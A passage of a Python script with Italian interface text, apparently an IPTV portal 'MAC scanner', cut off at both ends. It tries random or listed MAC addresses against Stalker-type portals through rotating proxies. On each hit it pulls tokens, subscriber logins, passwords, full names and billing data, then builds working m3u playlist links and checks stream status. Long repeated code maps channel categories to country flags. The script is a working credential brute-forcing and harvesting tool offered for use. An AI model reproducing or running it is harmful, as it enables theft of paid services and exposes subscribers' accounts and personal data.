\33[38;5;223mCittà  """+str(server_info_global.get('city', 'N/A'))+"""
\33[38;5;217mPannello  """+str(panel)+"""
\33[38;5;224mMac """+tokenr+str(mac)+"""
\33[38;5;216mCPM  """+str(cpm)+"""
\33[38;5;225mBot  """ +str(bot)+"""
\33[38;5;215mTotale """+str(total)+"""
\33[38;5;226mProgresso %"""+str(oran)+""" \33[0m
\33[38;5;214mStato:HTTP|"""+color+str(status_code)+"""
\33[38;5;227mOnline  """+str(maca)+"""\33[0m
\33[38;5;213mOffline/VPN """+str(macv)+""" \33[0m
\33[38;5;228mCombo """+str(combodosya)+""" \33[0m
\33[38;5;226mScaduti """  +str(macexp)+"""
\33[38;5;213mHits  """+str(hitr)+""" """ +str(hitc)+"""
""")
		print(echo)
		cpm=time.time()
	except:pass
	
	if status_code==200:color="\33[1m\33[32m""OK: "
	elif status_code==403:color="\33[1m\33[1;31m""Vietato: "
	elif status_code==404:color="\33[1m\33[1;31m""Non Trovato: "
	elif isinstance(status_code, int): color=f"\33[1;93m{status_code}: "
	else: color=f"\33[1;31m{status_code}: "

def goruntu(link):
	global macv, maca
	try:
		res = ses.get(link,  headers=hea3(), timeout=(2,5), allow_redirects=False,stream=True)
		duru="STREAM「 OFF 」🔒 "
		if res.status_code==200 or res.status_code==302:
			 duru="STREAM「 ONLINE 」✅😎 "
	except:
		duru="STREAM「 OFF 」🔒 "
	if "ONLINE" in duru:
		maca=maca+1
	else:
		macv=macv+1
	return duru

tokenr="\33[0m"
def hitprint(mac,trh):
	sesdosya="/sdcard/kemik_sesi.mp3"
	file = pathlib.Path(sesdosya)
	try:
		if file.exists():
		    pass
	except:pass
	print('✅BLAC BLOC MAC ONE✅                              \n  '+str(mac)+'\n  ' + str(trh))

def list(listlink,macs,token,livel, proxies={}):
	kategori=""
	veri=""
	bag=0
	while True:
		try:
			res = ses.get(listlink,  headers=hea2(macs,token), timeout=15, verify=False, proxies=proxies)
			veri=str(res.text)
			break
		except:
			bag=bag+1
			time.sleep(1)
			if bag==12:
				break

	if veri.count('title":"')>1:
			for i in veri.split('title":"'):
				try:
					kanal=""
					kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				except:pass
				kategori=kategori+kanal+livel
	return kategori

def get_media_count(url, macs, token, proxies={}):
    try:
        request_url = url
        if 'get_ordered_list' in url:
             request_url = f"{url}&p=1&limit=1"

        res = ses.get(request_url, headers=hea2(macs, token), timeout=10, verify=False, proxies=proxies)
        res.raise_for_status()
        data = res.json()

        if 'js' in data and 'total_items' in data['js']:
            return int(data['js']['total_items'])
        
        elif 'js' in data and 'data' in data['js'] and isinstance(data['js']['data'], list) and 'get_all_channels' in url:
             return len(data['js']['data'])
             
        return 0

    except (requests.exceptions.RequestException, ValueError, KeyError, TypeError):
        return 0

def m3uapi(playerlink,macs,token, proxies={}):
	mt=""
	bag=0
	userm, pasm = None, None
	while True:
			try:
				res = ses.get(playerlink, headers=hea2(macs,token), timeout=7, verify=False, proxies=proxies)
				veri=""
				veri=str(res.text)
				break
			except:
				time.sleep(1)
				bag=bag+1
				if bag==6:
					return "", None, None
	try:
			if 'active_cons' in veri:
				acon=veri.split('active_cons":')[1].split(',')[0].replace('"',"")
				mcon=veri.split('max_connections":')[1].split(',')[0].replace('"',"")
				status=veri.split('status":')[1].split(',')[0].replace('"',"")
				timezone=veri.split('timezone":"')[1].split('",')[0].replace("\/","/")
				port=veri.split('port":')[1].split(',')[0].replace('"',"")
				userm=veri.split('username":')[1].split(',')[0].replace('"',"")
				pasm=veri.split('password":')[1].split(',')[0].replace('"',"")
				bitism=veri.split('exp_date":')[1].split(',')[0].replace('"',"")

				if bitism=="null":
					bitism="Unlimited"
				else:
					bitism=(datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))

				mt=(f"""
☆▂▂EXTREME 🎃 INFO▂▂☆
PORTA {port}
UTENTE {userm}
PASSWORD {pasm}
CONNES ATTIVE {acon}
CONNES MAX {mcon}
STATO {status}
FUSO ORARIO {timezone}
🇮🇹SCRIPT FABRIZIO🇮🇹
""")
	except:
		return "", None, None
	return mt, userm, pasm


def d_logic(bot_number):
	global hitc, hitr, macexp, tokenr
	global proxy_corrente_ip, proxy_corrente_stato, server_info_global

	for mac_index in range(int(bot_number),uz,botsay):
		total=mac_index
		if dsyno=="0":
			mac=randommac()
		else:
			if mac_index < len(totLen):
				macv=re.search(pattern,totLen[mac_index],re.IGNORECASE)
				if macv:
					mac=macv.group()
				else:
					continue
			else:
			    continue
		macs_url=mac.upper().replace(':','%3A')
		macs_cookie=mac.upper()
		bot="Bot_"+str(bot_number + 1)
		oran=round(((total+1)/(uz)*100),2)
		
		proxies = {}
		proxy_ip_port = None
		if usa_proxy == "1" and file_proxy_contenuto:
			proxy_ip_port = random.choice(file_proxy_contenuto)
			protocol_map = {3: 'http', 4: 'socks4', 5: 'socks5'}
			protocol_str = protocol_map.get(protocollo_proxy, 'http')
			proxies = { 'http': f'{protocol_str}://{proxy_ip_port}', 'https': f'{protocol_str}://{proxy_ip_port}' }
			proxy_corrente_ip = proxy_ip_port
		else:
			proxy_corrente_ip = "Disabilitato"
			proxy_corrente_stato = ""
		
		status_code_hit = "N/A"
		server_header = "N/A"
		veri = ""
		bag=0
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs_cookie), timeout=15, verify=False, proxies=proxies)
				if usa_proxy == '1':
					proxy_corrente_stato = f"{VERDE}[ONLINE ✅]{RESET}"
				
				status_code_hit = res.status_code
				server_header = res.headers.get('Server', 'N/A')

				echok(mac,bot,total,hitc,res.status_code,oran)
				veri=str(res.text)
				break
			except:
				if usa_proxy == '1':
					proxy_corrente_stato = f"{ROSSO}[OFFLINE ❌]{RESET}"
				echok(mac,bot,total,hitc,"TIMEOUT",oran)
				bag=bag+1
				time.sleep(1)
				if bag==2:
					break
		
		if bag >= 2:
			continue

		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs_cookie,token), timeout=15, verify=False, proxies=proxies)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs_cookie,token), timeout=15, verify=False, proxies=proxies)
				     	veri_profilo = str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri_profilo.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	
			     	stalker_info_section = ""
			     	if "portal" in uzmanm:
			     	    billing_data = {
			     	        "bill": estrai_valore(veri_profilo, 'billing_date'),
			     	        "expire_bill": estrai_valore(veri_profilo, 'expire_billing_date'),
			     	        "login": estrai_valore(veri_profilo, 'login'),
			     	        "password": estrai_valore(veri_profilo, 'password'),
			     	        "fname": estrai_valore(veri_profilo, 'full_name'),
			     	        "ls": estrai_valore(veri_profilo, 'ls'),
			     	        "tariff_id": estrai_valore(veri_profilo, 'tariff_plan_id'),
			     	        "tariff_plan": estrai_valore(veri_profilo, 'tariff_plan_name'),
			     	        "max_online": estrai_valore(veri_profilo, 'max_online_devices'),
			     	        "country": estrai_valore(veri_profilo, 'country'),
			     	        "comment": estrai_valore(veri_profilo, 'comment')
			     	    }
			     	    
			     	    stalker_info_section = f"""
☆▂▂𝐒𝐓𝐀𝐋𝐊𝐄𝐑 🎫 𝐈𝐍𝐅𝐎▂▂☆
BILLING DATA {billing_data.get('bill')}
EXPIRE_DATA {billing_data.get('expire_bill')}
LOGIN {billing_data.get('login')}
PASSWORD {billing_data.get('password')}
FULL NOME {billing_data.get('fname')}
LS➢ {billing_data.get('ls')}
TARIFFE ID➢ {billing_data.get('tariff_id')}
PIANO TARIFFARIO➢ {billing_data.get('tariff_plan')}
MAX ONLINE➢ {billing_data.get('max_online')}
NAZIONE➢ {billing_data.get('country')}
MESSAGGIO➢ {billing_data.get('comment')}
🇮🇹SCRIPT FABRIZIO🇮🇹
"""

			     	trh=""
			     	if 'end_date' in veri_profilo:
			     		trh = veri_profilo.split('end_date":"')[1].split('"')[0]
			     	else:
			     		  try:
			     		      trh = veri_profilo.split('phone":"')[1].split('"')[0]
			     		      if trh.lower().startswith('un'):
			     		      	KalanGun = (" Giorni")
			     		      else:
			     		      	KalanGun = (str(tarih_clear(trh))+" Giorni")
			     		      	trh = trh + ' ' + KalanGun
			     		  except: pass
			     	hitprint(mac,trh)

			     	SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC = SN.upper()
			     	SNCUT = SNENC[:13]
			     	DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC = DEV.upper()
			     	SG = SNCUT + '+' + (mac)
			     	SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC = SING.upper()

			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs_cookie,token), timeout=10, verify=False, proxies=proxies)
				     		cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			cid="94067"
				     			break
			     	real=panel
			     	m3u_real=""
			     	m3u_panel=""
			     	user=""
			     	pas=""
			     	durum="Invalido Opps"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs_cookie,token), timeout=15, verify=False, proxies=proxies)
				     		link=res.json()['js']['cmd'].split('ffmpeg ')[1].replace('\/','/')
				     		real_host = link.split('://')[1].split('/')[0]
				     		real = f'http://{real_host}'

				     		from urllib.parse import urlparse, parse_qs
				     		parsed_link = urlparse(link)
				     		path_parts = parsed_link.path.split('/')
				     		user = path_parts[-2]
				     		pas = path_parts[-1]
				     		
				     		m3u_real="http://"+ real.replace('http://','').replace('/c/', '') + f"/get.php?username={user}&password={pas}&type=m3u_plus"
				     		m3u_panel="http://"+ panel.replace('/c/', '') + f"/get.php?username={user}&password={pas}&type=m3u_plus"
				     		
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break

			     	playerapi, user_api, pass_api = "", None, None
			     	if real != 'http://'+panel:
			     		playerlink=str(real.replace('/c/','') +f"/player_api.php?username={user}&password={pas}")
			     		playerapi, user_api, pass_api = m3uapi(playerlink,macs_cookie,token, proxies=proxies)
			     	else:
			     		playerlink=str("http://"+panel +f"/player_api.php?username={user}&password={pas}")
			     		playerapi, user_api, pass_api = m3uapi(playerlink,macs_cookie,token, proxies=proxies)
			     	
			     	# Ottiene info della connessione della macchina (reale, senza proxy)
			     	vpn_info = get_vpn_info()
			     	
			     	# Prepara le informazioni specifiche del proxy usato per l'hit
			     	proxy_details = {}
			     	proxy_type_str = "N/A"
			     	proxy_status_str = "[Disabilitato]"
			     	if usa_proxy == "1" and proxy_ip_port:
			     		proxy_details = get_info_ip(proxy_ip_port.split(':')[0])
			     		protocol_map = {3: 'HTTP/s', 4: 'Socks4', 5: 'Socks5'}
			     		proxy_type_str = protocol_map.get(protocollo_proxy, 'Sconosciuto')
			     		if "[ONLINE" in proxy_corrente_stato:
			     		    proxy_status_str = "[ONLINE ✅]"
			     		else:
			     		    proxy_status_str = "[OFFLINE ❌]"

			     	live_count = get_media_count(live_count_url, macs_cookie, token, proxies=proxies)
			     	vod_count = get_media_count(vod_count_url, macs_cookie, token, proxies=proxies)
			     	series_count = get_media_count(series_count_url, macs_cookie, token, proxies=proxies)

			     	livelist = ""
			     	vodlist = ""
			     	serieslist = ""

			     	if kanalkata == "1" or kanalkata == "2":
			     	   livelist = list(liveurl, macs_cookie, token, '⍟', proxies=proxies)
			     	   livelist = livelist.upper()
			     	   livelist = livelist.replace( "⍟AE", " |🇦🇪AE")
			     	   livelist = livelist.replace( "⍟UAE", " |🇦🇪 UAE" )
			     	   livelist = livelist.replace( "⍟ALL", " |🏁ALL" )
			     	   livelist = livelist.replace( "⍟ALB", " |🇦🇱 ALB" )
			     	   livelist = livelist.replace( "⍟AR", " |🇸🇦 AR" )
			     	   livelist = livelist.replace( "⍟ASIA", " 🈲️ ASIA" )
			     	   livelist = livelist.replace( "⍟AT", " |🇦🇹 AT" )
			     	   livelist = livelist.replace( "⍟AU", " |🇦🇺 AU" )
			     	   livelist = livelist.replace( "⍟AZ", " |🇦🇿 AZ" )
			     	   livelist = livelist.replace( "⍟BE", " |🇧🇪 BE" )
			     	   livelist = livelist.replace( "⍟BG", " |🇧🇬 BG" )
			     	   livelist = livelist.replace( "⍟BIH", " |🇧🇦 BIH" )
			     	   livelist = livelist.replace( "⍟BO", " |🇧🇴 BO" )
			     	   livelist = livelist.replace( "⍟BR", " |🇧🇷 BR" )
			     	   livelist = livelist.replace( "⍟CA", " |🇨🇦 CA" )
			     	   livelist = livelist.replace( "⍟CH", " |🇨🇭 CH" )
			     	   livelist = livelist.replace( "⍟SW", " |🇨🇭 SW" )
			     	   livelist = livelist.replace( "⍟CL", " |🇨🇱 CL" )
			     	   livelist = livelist.replace( "⍟CN", " |🇨🇳 CN" )
			     	   livelist = livelist.replace( "⍟CO", " |🇨🇴 CO" )
			     	   livelist = livelist.replace( "⍟CR", " |🇭🇷 CR" )
			     	   livelist = livelist.replace( "⍟CZ", " |🇨🇿 CZ" )
			     	   livelist = livelist.replace( "⍟DE", " |🇩🇪 DE" )
			     	   livelist = livelist.replace( "⍟De", " |🇩🇪 De" )
			     	   livelist = livelist.replace( "⍟GE", " |🇩🇪 GE" )
			     	   livelist = livelist.replace( "⍟DK", " |🇩🇰 DK" )
			     	   livelist = livelist.replace( "⍟DM", " |🇩🇰 DM" )
			     	   livelist = livelist.replace( "⍟EC", " |🇪🇨 EC" )
			     	   livelist = livelist.replace( "⍟EG", " |🇪🇬 EG" )
			     	   livelist = livelist.replace( "⍟EN", " |🇬🇧 EN" )
			     	   livelist = livelist.replace( "⍟GB", " |🇬🇧 GB" )
			     	   livelist = livelist.replace( "⍟UK", " |🇬🇧 UK" )
			     	   livelist = livelist.replace( "⍟EU", " |🇪🇺 EU" )
			     	   livelist = livelist.replace( "⍟ES", " |🇪🇸 ES" )
			     	   livelist = livelist.replace( "⍟SP", " |🇪🇸 SP" )
			     	   livelist = livelist.replace( "⍟EX", " |🇭🇷 EX" )
			     	   livelist = livelist.replace( "⍟YU", " |🇭🇷 YU" )
			     	   livelist = livelist.replace( "⍟FI", " |🇫🇮 FI" )
			     	   livelist = livelist.replace( "⍟FR", " |🇫🇷 FR" )
			     	   livelist = livelist.replace( "⍟FI", " |🇫🇮 FI" )
			     	   livelist = livelist.replace( "⍟GOR", " |🇲🇪 GOR" )
			     	   livelist = livelist.replace( "⍟GR", " |🇬🇷 GR" )
			     	   livelist = livelist.replace( "⍟HR", " |🇭🇷 HR" )
			     	   livelist = livelist.replace( "⍟HU", " |🇭🇺 HU" )
			     	   livelist = livelist.replace( "⍟IE", " |🇮🇪 IE" )
			     	   livelist = livelist.replace( "⍟IL", " |🇮🇪 IL" )
			     	   livelist = livelist.replace( "⍟IR", " |🇮🇪 IR" )
			     	   livelist = livelist.replace( "⍟ID", " |🇮🇩 ID" )
			     	   livelist = livelist.replace( "⍟IN", " |🇮🇳 IN" )
			     	   livelist = livelist.replace( "⍟IT", " |🇮🇹 IT" )
			     	   livelist = livelist.replace( "⍟JP", " |🇯🇵 JP" )
			     	   livelist = livelist.replace( "⍟KE", " |🇰🇪 KE" )
			     	   livelist = livelist.replace( "⍟KU", " |🇭🇺 KU" )
			     	   livelist = livelist.replace( "⍟KR", " |🇰🇷 KR" )
			     	   livelist = livelist.replace( "⍟LU", " |🇱🇺 LU" )
			     	   livelist = livelist.replace( "⍟MKD", " |🇲🇰 MKD" )
			     	   livelist = livelist.replace( "⍟MX", " |🇲🇽 MX" )
			     	   livelist = livelist.replace( "⍟MY", " |🇲🇾 MY" )
			     	   livelist = livelist.replace( "⍟NETFLIX", " | 🚩 NETFLIX" )
			     	   livelist = livelist.replace( "⍟NG", " |🇳🇬 NG" )
			     	   livelist = livelist.replace( "⍟NZ", " |🇳🇿 NZ" )
			     	   livelist = livelist.replace( "⍟NL", " |🇳🇱 NL" )
			     	   livelist = livelist.replace( "⍟NO", " |🇳🇴 NO" )
			     	   livelist = livelist.replace( "⍟PA", " |🇵🇦 PA" )
			     	   livelist = livelist.replace( "⍟PE", " |🇵🇪 PE" )
			     	   livelist = livelist.replace( "⍟PH", " |🇵🇭 PH" )
			     	   livelist = livelist.replace( "⍟PK", " |🇵🇰 PK" )
			     	   livelist = livelist.replace( "⍟PL", " |🇵🇱 PL" )
			     	   livelist = livelist.replace( "⍟PT", " |🇵🇹 PT" )
			     	   livelist = livelist.replace( "⍟PPV", " |🏋🏼‍♂️ PPV" )
			     	   livelist = livelist.replace( "⍟QA", " |🇶🇦 QA" )
			     	   livelist = livelist.replace( "⍟RO", " |🇷🇴 RO" )
			     	   livelist = livelist.replace( "⍟RU", " |🇷🇺 RU" )
			     	   livelist = livelist.replace( "⍟SA", " |🇸🇦 SA" )
			     	   livelist = livelist.replace( "⍟SCREENSAVER", " | 🏞 SCREENSAVER" )
			     	   livelist = livelist.replace( "⍟SE", " |🇸🇪 SE" )
			     	   livelist = livelist.replace( "⍟SK", " |🇸🇰 SK" )
			     	   livelist = livelist.replace( "⍟SL", " |🇸🇮 SL" )
			     	   livelist = livelist.replace( "⍟SG", " |🇸🇬 SG" )
			     	   livelist = livelist.replace( "⍟SR", " |🇷🇸 SR" )
			     	   livelist = livelist.replace( "⍟SU", " |🇦🇲 SU" )
			     	   livelist = livelist.replace( "⍟TH", " |🇹🇭 TH" )
			     	   livelist = livelist.replace( "⍟TR", " |🇹🇷 TR" )
			     	   livelist = livelist.replace( "⍟TW", " |🇹🇼 TW" )
			     	   livelist = livelist.replace( "⍟UKR", " |🇺🇦 UKR" )
			     	   livelist = livelist.replace( "⍟US", " |🇺🇸 US" )
			     	   livelist = livelist.replace( "⍟VN", " |🇻🇳 VN" )
			     	   livelist = livelist.replace( "⍟VIP", " |⚽️ VIP" )
			     	   livelist = livelist.replace( "⍟WEB", " |🏳️‍🌈 WEB" )
			     	   livelist = livelist.replace( "⍟ZA", " |🇿🇦 ZA" )
			     	   livelist = livelist.replace( "⍟AF", " |🇿🇦 AF" )
			     	   livelist = livelist.replace( "⍟ADU", " |🔞 ADULTS" )
			     	   livelist = livelist.replace( "⍟FO", " |🔞 FOR" )
			     	   livelist = livelist.replace( "⍟⋅ FOR", " |🔞 ⋅ FOR" )
			     	   livelist = livelist.replace( "⍟BLU", " |🔞 BLU" )
			     	   livelist = livelist.replace( "⍟XXX", " |🔞 XXX" )
			     	   livelist = livelist.replace( "⍟", " |®️ " )
			     	if kanalkata == "2":
			     	   vodlist = list(vodurl, macs_cookie, token, '⍟', proxies=proxies)
			     	   vodlist = vodlist.upper()
			     	   vodlist = vodlist.replace( "⍟AE", " |🇦🇪 AE" )
			     	   vodlist = vodlist.replace( "⍟UAE", " |🇦🇪 UAE")
			     	   vodlist = vodlist.replace( "⍟ALL", " |🏁ALL" )
			     	   vodlist = vodlist.replace( "⍟ALB", " |🇦🇱 ALB" )
			     	   vodlist = vodlist.replace( "⍟AR", " |🇸🇦 AR" )
			     	   vodlist = vodlist.replace( "⍟ASIA", " 🈲️ ASIA" )
			     	   vodlist = vodlist.replace( "⍟AT", " |🇦🇹 AT" )
			     	   vodlist = vodlist.replace( "⍟AU", " |🇦🇺 AU" )
			     	   vodlist = vodlist.replace( "⍟AZ", " |🇦🇿 AZ" )
			     	   vodlist = vodlist.replace( "⍟BE", " |🇧🇪 BE" )
			     	   vodlist = vodlist.replace( "⍟BG", " |🇧🇬 BG" )
			     	   vodlist = vodlist.replace( "⍟BIH", " |🇧🇦 BIH" )
			     	   vodlist = vodlist.replace( "⍟BO", " |🇧🇴 BO" )
			     	   vodlist = vodlist.replace( "⍟BR", " |🇧🇷 BR" )
			     	   vodlist = vodlist.replace( "⍟CA", " |🇨🇦 CA" )
			     	   vodlist = vodlist.replace( "⍟CH", " |??🇭 CH" )
			     	   vodlist = vodlist.replace( "⍟SW", " |🇨🇭 SW" )
			     	   vodlist = vodlist.replace( "⍟CL", " |🇨🇱 CL" )
			     	   vodlist = vodlist.replace( "⍟CN", " |🇨🇳 CN" )
			     	   vodlist = vodlist.replace( "⍟CO", " |🇨🇴 CO" )
			     	   vodlist = vodlist.replace( "⍟CR", " |🇭🇷 CR" )
			     	   vodlist = vodlist.replace( "⍟CZ", " |🇨🇿 CZ" )
			     	   vodlist = vodlist.replace( "⍟DE", " |🇩🇪 DE" )
			     	   vodlist = vodlist.replace( "⍟De", " |🇩🇪 De" )
			     	   vodlist = vodlist.replace( "⍟GE", " |🇩🇪 GE" )
			     	   vodlist = vodlist.replace( "⍟DK", " |🇩🇰 DK" )
			     	   vodlist = vodlist.replace( "⍟DM", " |🇩🇰 DM" )
			     	   vodlist = vodlist.replace( "⍟EC", " |🇪🇨 EC" )
			     	   vodlist = vodlist.replace( "⍟EG", " |🇪🇬 EG" )
			     	   vodlist = vodlist.replace( "⍟EN", " |🇬🇧 EN" )
			     	   vodlist = vodlist.replace( "⍟GB", " |🇬🇧 GB" )
			     	   vodlist = vodlist.replace( "⍟UK", " |🇬🇧 UK" )
			     	   vodlist = vodlist.replace( "⍟EU", " |🇪🇺 EU" )
			     	   vodlist = vodlist.replace( "⍟ES", " |🇪🇸 ES" )
			     	   vodlist = vodlist.replace( "⍟SP", " |🇪🇸 SP" )
			     	   vodlist = vodlist.replace( "⍟EX", " |🇭🇷 EX" )
			     	   vodlist = vodlist.replace( "⍟YU", " |🇭🇷 YU" )
			     	   vodlist = vodlist.replace( "⍟FI", " |🇫🇮 FI" )
			     	   vodlist = vodlist.replace( "⍟FR", " |🇫🇷 FR" )
			     	   vodlist = vodlist.replace( "⍟FI", " |🇫🇮 FI" )
			     	   vodlist = vodlist.replace( "⍟GOR", " |🇲🇪 GOR")
			     	   vodlist = vodlist.replace( "⍟GR", " |🇬🇷 GR" )
			     	   vodlist = vodlist.replace( "⍟HR", " |🇭🇷 HR" )
			     	   vodlist = vodlist.replace( "⍟HU", " |🇭🇺 HU" )
			     	   vodlist = vodlist.replace( "⍟IE", " |🇮🇪 IE" )
			     	   vodlist = vodlist.replace( "⍟IL", " |🇮🇪 IL" )
			     	   vodlist = vodlist.replace( "⍟IR", " |🇮🇪 IR" )
			     	   vodlist = vodlist.replace( "⍟ID", " |🇮🇩 ID" )
			     	   vodlist = vodlist.replace( "⍟IN", " |🇮🇳 IN" )
			     	   vodlist = vodlist.replace( "⍟IT", " |🇮🇹 IT" )
			     	   vodlist = vodlist.replace( "⍟JP", " |🇯🇵 JP" )
			     	   vodlist = vodlist.replace( "⍟KE", " |🇰🇪 KE" )
			     	   vodlist = vodlist.replace( "⍟KU", " |🇭🇺 KU" )
			     	   vodlist = vodlist.replace( "⍟KR", " |🇰🇷 KR" )
			     	   vodlist = vodlist.replace( "⍟LU", " |🇱🇺 LU" )
			     	   vodlist = vodlist.replace( "⍟MKD", " |🇲🇰 MKD" )
			     	   vodlist = vodlist.replace( "⍟MX", " |🇲🇽 MX" )
			     	   vodlist = vodlist.replace( "⍟MY", " |🇲🇾 MY" )
			     	   vodlist = vodlist.replace( "⍟NETFLIX", " | 🚩 NETFLIX" )
			     	   vodlist = vodlist.replace( "⍟NG", " |🇳🇬 NG" )
			     	   vodlist = vodlist.replace( "⍟NZ", " |🇳🇿 NZ" )
			     	   vodlist = vodlist.replace( "⍟NL", " |🇳🇱 NL" )
			     	   vodlist = vodlist.replace( "⍟NO", " |🇳🇴 NO" )
			     	   vodlist = vodlist.replace( "⍟PA", " |🇵🇦 PA" )
			     	   vodlist = vodlist.replace( "⍟PE", " |🇵🇪 PE" )
			     	   vodlist = vodlist.replace( "⍟PH", " |🇵🇭 PH" )
			     	   vodlist = vodlist.replace( "⍟PK", " |🇵🇰 PK" )
			     	   vodlist = vodlist.replace( "⍟PL", " |🇵🇱 PL" )
			     	   vodlist = vodlist.replace( "⍟PT", " |🇵🇹 PT" )
			     	   vodlist = vodlist.replace( "⍟PPV", " |🏋🏼‍♂️ PPV" ,)
			     	   vodlist = vodlist.replace( "⍟QA", " |🇶🇦 QA" )
			     	   vodlist = vodlist.replace( "⍟RO", " |🇷🇴 RO" )
			     	   vodlist = vodlist.replace( "⍟RU", " |🇷🇺 RU" )
			     	   vodlist = vodlist.replace( "⍟SA", " |🇸🇦 SA" )
			     	   vodlist = vodlist.replace( "⍟SCREENSAVER", " | 🏞 SCREENSAVER" )
			     	   vodlist = vodlist.replace( "⍟SE", " |🇸🇪 SE" )
			     	   vodlist = vodlist.replace( "⍟SK", " |🇸🇰 SK" )
			     	   vodlist = vodlist.replace( "⍟SL", " |🇸🇮 SL" )
			     	   vodlist = vodlist.replace( "⍟SG", " |🇸🇬 SG" )
			     	   vodlist = vodlist.replace( "⍟SR", " |🇷🇸 SR" )
			     	   vodlist = vodlist.replace( "⍟SU", " |🇦🇲 SU" )
			     	   vodlist = vodlist.replace( "⍟TH", " |🇹🇭 TH" )
			     	   vodlist = vodlist.replace( "⍟TR", " |🇹🇷 TR" )
			     	   vodlist = vodlist.replace( "⍟TW", " |🇹🇼 TW" )
			     	   vodlist = vodlist.replace( "⍟UKR", " |🇺🇦 UKR" )
			     	   vodlist = vodlist.replace( "⍟US", " |🇺🇸 US" )
			     	   vodlist = vodlist.replace( "⍟VN", " |🇻🇳 VN" )
			     	   vodlist = vodlist.replace( "⍟VIP", " |⚽️ VIP" )
			     	   vodlist = vodlist.replace( "⍟WEB", " |🏳️‍🌈 WEB" )
			     	   vodlist = vodlist.replace( "⍟ZA", " |🇿🇦 ZA" )
			     	   vodlist = vodlist.replace( "⍟AF", " |🇿🇦 AF" )
			     	   vodlist = vodlist.replace( "⍟ADU", " |🔞 ADULTS" )
			     	   vodlist = vodlist.replace( "⍟FO", " |🔞 FOR" )
			     	   vodlist = vodlist.replace( "⍟⋅ FOR", " |🔞 ⋅ FOR" )
			     	   vodlist = vodlist.replace( "⍟BLU", " |🔞 BLU" )
			     	   vodlist = vodlist.replace( "⍟XXX", " |🔞 XXX" )
			     	   vodlist = vodlist.replace( "⍟", " |®️ " )
			     	   serieslist = list(seriesurl, macs_cookie, token, '⍟', proxies=proxies)
			     	   serieslist = serieslist.upper()
			     	   serieslist = serieslist.replace( "⍟AE", " |🇦🇪 AE" )
			     	   serieslist = serieslist.replace( "⍟UAE", " |🇦🇪 UAE" )
			     	   serieslist = serieslist.replace( "⍟ALL", " |🏁ALL" )
			     	   serieslist = serieslist.replace( "⍟ALB", " |🇦🇱 ALB" )
			     	   serieslist = serieslist.replace( "⍟AR", " |🇸🇦 AR" )
			     	   serieslist = serieslist.replace( "⍟ASIA", " 🈲️ ASIA" )
			     	   serieslist = serieslist.replace( "⍟AT", " |🇦🇹 AT" )
			     	   serieslist = serieslist.replace( "⍟AU", " |🇦🇺 AU" )
			     	   serieslist = serieslist.replace( "⍟AZ", " |🇦🇿 AZ")
			     	   serieslist = serieslist.replace( "⍟BE", " |🇧🇪 BE" )
			     	   serieslist = serieslist.replace( "⍟BG", " |🇧🇬 BG" )
			     	   serieslist = serieslist.replace( "⍟BIH", " |🇧🇦 BIH" )
			     	   serieslist = serieslist.replace( "⍟BO", " |🇧🇴 BO" )
			     	   serieslist = serieslist.replace( "⍟BR", " |🇧🇷 BR")
			     	   serieslist = serieslist.replace( "⍟CA", " |🇨🇦 CA" )
			     	   serieslist = serieslist.replace( "⍟CH", " |🇨🇭 CH" )
			     	   serieslist = serieslist.replace( "⍟SW", " |🇨🇭 SW" )
			     	   serieslist = serieslist.replace( "⍟CL", " |🇨🇱 CL" )
			     	   serieslist = serieslist.replace( "⍟CN", " |🇨🇳 CN" )
			     	   serieslist = serieslist.replace( "⍟CO", " |🇨🇴 CO" )
			     	   serieslist = serieslist.replace( "⍟CR", " |🇭🇷 CR" )
			     	   serieslist = serieslist.replace( "⍟CZ", " |🇨🇿 CZ" )
			     	   serieslist = serieslist.replace( "⍟DE", " |🇩🇪 DE" )
			     	   serieslist = serieslist.replace( "⍟De", " |🇩🇪 De" )
			     	   serieslist = serieslist.replace( "⍟GE", " |🇩🇪 GE" )
			     	   serieslist = serieslist.replace( "⍟DK", " |🇩🇰 DK" )
			     	   serieslist = serieslist.replace( "⍟DM", " |🇩🇰 DM" )
			     	   serieslist = serieslist.replace( "⍟EC", " |🇪🇨 EC" )
			     	   serieslist = serieslist.replace( "⍟EG", " |🇪🇬 EG" )
			     	   serieslist = serieslist.replace( "⍟EN", " |🇬🇧 EN" )
			     	   serieslist = serieslist.replace( "⍟GB", " |🇬🇧 GB" )
			     	   serieslist = serieslist.replace( "⍟UK", " |🇬🇧 UK" )
			     	   serieslist = serieslist.replace( "⍟EU", " |🇪🇺 EU" )
			     	   serieslist = serieslist.replace( "⍟ES", " |🇪🇸 ES" )
			     	   serieslist = serieslist.replace( "⍟SP", " |🇪🇸 SP" )
			     	   serieslist = serieslist.replace( "⍟EX", " |🇭🇷 EX" )
			     	   serieslist = serieslist.replace( "⍟YU", " |🇭🇷 YU" )
			     	   serieslist = serieslist.replace( "⍟FI", " |🇫🇮 FI" )
			     	   serieslist = serieslist.replace( "⍟FR", " |🇫🇷 FR" )
